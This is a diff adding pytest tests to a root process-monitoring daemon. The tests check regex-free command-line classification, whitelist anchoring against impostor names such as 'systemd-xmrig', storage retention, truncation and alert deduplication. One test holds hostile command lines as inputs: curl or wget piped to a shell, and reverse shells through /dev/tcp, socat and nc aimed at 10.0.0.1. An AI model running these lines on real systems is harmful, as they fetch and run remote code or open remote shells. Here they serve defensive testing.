@@ -19,6 +19,7 @@ import os
 import shutil
 import smtplib
 import tempfile
+import time
 import types
 from pathlib import Path
 from typing import Any, ClassVar
@@ -633,3 +634,328 @@ def test_smtp_failure_does_not_leak_the_password(
 
     rendered = f"{excinfo.value} {getattr(excinfo.value, 'details', '')}"
     assert "hunter2-do-not-log" not in rendered
+
+
+# ---------------------------------------------------------------------------
+# Cost of classification
+#
+# The daemon runs as root, in one thread, over every process on the machine.
+# Any unprivileged user can choose the contents of their own argv, so anything
+# the classifier does with a command line is an input the attacker controls.
+# The previous version matched ``curl\s[^|]*\|\s*(ba)?sh`` against it: quadratic
+# backtracking, driven by a hostile string, inside the scan loop.
+# ---------------------------------------------------------------------------
+
+#: A command line no legitimate program produces, and any user can.
+HOSTILE_COMMAND = "curl " * 20_000
+
+#: Budget for classifying one process. The daemon classifies thousands.
+CLASSIFY_BUDGET_SECONDS = 0.1
+
+
+def _process_info(**overrides: Any) -> Any:
+    """
+    Build a ProcessInfo with sensible defaults.
+
+    Args:
+        overrides: Fields to replace.
+
+    Returns:
+        The process snapshot.
+    """
+    from wasm.monitor.models import ProcessInfo
+
+    fields: dict[str, Any] = {
+        "pid": 4242,
+        "name": "payload",
+        "user": "nobody",
+        "cpu_percent": 1.0,
+        "memory_percent": 1.0,
+        "command": "payload",
+    }
+    fields.update(overrides)
+    return ProcessInfo(**fields)
+
+
+def test_classifying_a_hostile_command_line_is_fast() -> None:
+    """A 100 KB argv chosen by a local user must not stall the root daemon."""
+    from wasm.monitor.signals import observe_process
+
+    process = _process_info(command=HOSTILE_COMMAND)
+
+    started = time.perf_counter()
+    observe_process(process, cpu_threshold=80.0, memory_threshold=80.0)
+    elapsed = time.perf_counter() - started
+
+    assert elapsed < CLASSIFY_BUDGET_SECONDS, (
+        f"classifying one process took {elapsed:.3f}s; a scan sees thousands"
+    )
+
+
+def test_classifying_a_whole_hostile_process_table_is_fast() -> None:
+    """The cost has to stay linear across the table, not just per process."""
+    from wasm.monitor.signals import observe_processes
+
+    processes = [_process_info(pid=i, command=HOSTILE_COMMAND) for i in range(50)]
+
+    started = time.perf_counter()
+    observe_processes(processes, cpu_threshold=80.0, memory_threshold=80.0)
+    elapsed = time.perf_counter() - started
+
+    assert elapsed < 1.0, f"scanning 50 hostile processes took {elapsed:.3f}s"
+
+
+def test_command_line_content_alone_never_produces_an_observation() -> None:
+    """
+    What a process reads, downloads or greps for is not evidence about it.
+
+    Dropping the command-line patterns is the decision that removes the whole
+    "the cmdline drives the monitor" class, ReDoS included.
+    """
+    from wasm.monitor.signals import observe_process
+
+    for command in (
+        "curl https://example.com/install.sh | sh",
+        "wget -qO- https://example.com/x | bash",
+        "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444'",
+        "socat tcp:10.0.0.1:9 exec:/bin/sh",
+        "nc -e /bin/sh 10.0.0.1 4444",
+    ):
+        observation = observe_process(
+            _process_info(command=command),
+            cpu_threshold=80.0,
+            memory_threshold=80.0,
+        )
+        assert observation is None, f"command line alone produced an observation: {command}"
+
+
+def test_signals_module_uses_no_regular_expressions() -> None:
+    """
+    No regex, no backtracking. The rule is enforced on the source.
+
+    A future pattern would reintroduce the risk quietly; this makes it loud.
+    """
+    source = (MONITOR_PACKAGE / "signals.py").read_text()
+    tree = ast.parse(source, filename="signals.py")
+
+    imports = {
+        alias.name.split(".")[0]
+        for node in ast.walk(tree)
+        if isinstance(node, ast.Import)
+        for alias in node.names
+    } | {
+        (node.module or "").split(".")[0]
+        for node in ast.walk(tree)
+        if isinstance(node, ast.ImportFrom)
+    }
+
+    assert "re" not in imports, "signals.py imports re again; matching must stay linear"
+
+
+# ---------------------------------------------------------------------------
+# Whitelist anchoring
+# ---------------------------------------------------------------------------
+
+
+def test_an_impostor_named_after_a_system_daemon_is_not_known_safe() -> None:
+    """``^systemd`` as a prefix match makes 'systemd-xmrig' a trusted process."""
+    from wasm.monitor.signals import is_known_safe
+
+    for name in (
+        "systemd-xmrig",
+        "systemdd",
+        "postgres-miner",
+        "dbus-kinsing",
+        "nginxx",
+        "containerd-evil",
+        "php-fpm-backdoor",
+        "python3-xmrig",
+        "wasm-miner",
+    ):
+        assert is_known_safe(_process_info(name=name)) is False, f"{name} passed as known safe"
+
+
+def test_real_system_daemons_are_still_known_safe() -> None:
+    """Anchoring must not turn the whitelist into dead code."""
+    from wasm.monitor.signals import is_known_safe
+
+    for name in (
+        "systemd",
+        "systemd-journald",
+        "sshd",
+        "nginx",
+        "postgres",
+        "mysqld",
+        "node",
+        "python3",
+        "python3.11",
+        "php-fpm8.2",
+        "dbus-daemon",
+        "wasm",
+    ):
+        assert is_known_safe(_process_info(name=name)) is True, f"{name} lost its whitelist entry"
+
+
+def test_an_impostor_is_still_reported_when_it_burns_the_machine() -> None:
+    """Failing the whitelist means the resource signal applies to it."""
+    from wasm.monitor.signals import observe_process
+
+    observation = observe_process(
+        _process_info(name="systemd-xmrig", cpu_percent=99.0),
+        cpu_threshold=80.0,
+        memory_threshold=80.0,
+    )
+
+    assert observation is not None
+    assert observation.signal == "resource-usage"
+
+
+# ---------------------------------------------------------------------------
+# What the store keeps, and for how long
+# ---------------------------------------------------------------------------
+
+
+def _observation(pid: int, name: str = "xmrig", signal: str = "name-pattern") -> Any:
+    """
+    Build an observation for the store tests.
+
+    Args:
+        pid: Process identifier to record.
+        name: Executable name to record.
+        signal: Which check produced it.
+
+    Returns:
+        The observation.
+    """
+    from wasm.monitor.models import ProcessObservation
+
+    return ProcessObservation(
+        process=_process_info(pid=pid, name=name),
+        signal=signal,
+        severity="warning",
+        detail="detail",
+    )
+
+
+def test_the_store_keeps_a_bounded_number_of_observations(tmp_path: Path) -> None:
+    """A daemon scanning every minute forever must not fill the disk."""
+    from wasm.monitor.observation_store import ObservationStore
+
+    store = ObservationStore(db_path=tmp_path / "observations.db", max_observations=100)
+
+    for pid in range(500):
+        store.save_many([_observation(pid=pid)])
+
+    assert store.stats()["total"] <= 100
+    newest = store.recent(limit=1)
+    assert newest and newest[0]["pid"] == 499, (
+        "the cap dropped the newest rows instead of the oldest"
+    )
+
+
+def test_the_store_does_not_rewrite_the_same_observation_every_scan(tmp_path: Path) -> None:
+    """One noisy process for an hour is one row, not sixty."""
+    from wasm.monitor.observation_store import ObservationStore
+
+    store = ObservationStore(db_path=tmp_path / "observations.db")
+
+    for _ in range(60):
+        store.save_many([_observation(pid=1234)])
+
+    assert store.stats()["total"] == 1
+
+
+def test_the_store_purges_observations_past_the_retention_window(tmp_path: Path) -> None:
+    """Retention is enforced by deleting, not by hoping."""
+    from wasm.monitor.observation_store import ObservationStore
+
+    store = ObservationStore(db_path=tmp_path / "observations.db")
+    (row_id,) = store.save_many([_observation(pid=7)])
+
+    connection = store._get_connection()
+    with connection:
+        connection.execute(
+            "UPDATE observations SET observed_at = datetime('now', '-40 days') WHERE id = ?",
+            (row_id,),
+        )
+
+    assert store.purge_older_than(30) == 1
+    assert store.stats()["total"] == 0
+
+
+def test_a_hostile_command_line_is_truncated_before_it_is_stored(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """100 KB of argv per process, once a minute, is a database, not a log."""
+    from wasm.monitor.metrics import MAX_COMMAND_LENGTH, list_processes
+
+    _install_processes(
+        monkeypatch,
+        [_make_process(pid=5, name="payload", cmdline=["curl"] * 20_000)],
+    )
+
+    (process,) = list_processes()
+
+    assert len(process.command) <= MAX_COMMAND_LENGTH
+
+
+def test_disk_reporting_skips_read_only_and_repeated_mounts(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """
+    A capacity report is about filesystems an operator can fill.
+
+    Snaps are squashfs images pinned at 100%, and container bind mounts repeat
+    the same device dozens of times; both turn the report into noise and cost a
+    statvfs each, on every scan.
+    """
+    from wasm.monitor.metrics import collect_resource_metrics
+
+    _install_psutil_metrics(monkeypatch)
+    monkeypatch.setattr(
+        psutil,
+        "disk_partitions",
+        lambda all=False: [
+            types.SimpleNamespace(device="/dev/sda1", mountpoint="/", fstype="ext4", opts="rw"),
+            types.SimpleNamespace(
+                device="/dev/sda1", mountpoint="/var/lib/docker/x", fstype="ext4", opts="rw"
+            ),
+            types.SimpleNamespace(
+                device="/dev/loop3", mountpoint="/snap/core", fstype="squashfs", opts="ro,nodev"
+            ),
+        ],
+    )
+
+    metrics = collect_resource_metrics()
+
+    assert [d.mountpoint for d in metrics.disks] == ["/"]
+
+
+def test_a_process_that_keeps_misbehaving_is_reported_once_per_window(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+) -> None:
+    """
+    Repetition is not news.
+
+    With a real store behind it, a scan every minute over a process that stays
+    over the threshold writes one row and sends one email per deduplication
+    window, not one of each per scan.
+    """
+    from wasm.monitor.observation_store import ObservationStore
+    from wasm.monitor.process_monitor import MonitorConfig, ProcessMonitor
+
+    _install_processes(monkeypatch, [_make_process()])
+    store = ObservationStore(db_path=tmp_path / "observations.db")
+    notifier = _RecordingNotifier()
+    monitor = ProcessMonitor(
+        config=MonitorConfig(notify=True),
+        store=store,
+        notifier=notifier,
+    )
+
+    for _ in range(5):
+        assert len(monitor.scan_once()) == 1
+
+    assert store.stats()["total"] == 1
+    assert len(notifier.sent) == 1, "the same process was mailed about on every scan"
